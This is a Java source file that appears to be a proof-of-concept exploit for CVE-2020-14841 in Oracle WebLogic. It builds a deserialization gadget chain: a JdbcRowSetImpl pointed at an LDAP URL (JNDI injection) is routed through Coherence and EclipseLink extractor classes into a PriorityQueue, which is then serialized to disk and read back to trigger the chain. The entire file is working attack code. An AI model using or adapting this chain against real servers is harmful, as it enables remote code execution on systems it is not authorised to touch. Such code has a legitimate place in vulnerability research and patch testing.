package com.r17a.weblogic.cve;

import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CVE_2020_14841 {
    public static void main(String[] args) throws Exception {
        // JdbcRowSetImpl
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/cn=foo,dc=example,dc=com");

        MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
        methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");
        methodAttributeAccessor.setIsWriteOnly(true);
        methodAttributeAccessor.setAttributeName("xxx");

        LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "xxx");

        ExtractorComparator comparator = new ExtractorComparator(extractor);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);


        Object[] q = new Object[]{jdbcRowSet, 1};
        Field queueField = queue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(queue, q);
        Field sizeField = queue.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(queue);

        FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
